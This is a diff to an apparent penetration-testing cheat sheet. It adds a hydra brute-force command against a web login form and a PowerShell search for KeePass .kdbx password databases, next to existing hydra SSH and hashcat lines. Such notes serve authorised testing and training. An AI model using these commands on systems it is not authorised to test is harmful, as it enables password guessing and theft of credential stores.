@@ -196,6 +196,9 @@ Flags: Use module 10000, crack hash.txt, use passlist.txt
 	hydra -l user -P passlist.txt ssh://123.123.123.123:22
 password guess. Use `-L userlist.txt and -p password` for password spray  
 
+	hydra -l username -P passlist.txt 123.123.123.123 http-post-form "/login.php:userparameter=^USER^&passparameter=^PASS^:Login failed!"
+post login with specific parameters. `Login failed!` is the failure string
+
 
 ## Compromised User Access
 ### SSH
@@ -260,6 +263,10 @@ Write clipboard into file
 .  
 
 	dir /s/a/q/n
+
+## Windows - search
+	Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Search for any file with .kdbx extension  
 
 ## Windows - check env
 	systeminfo
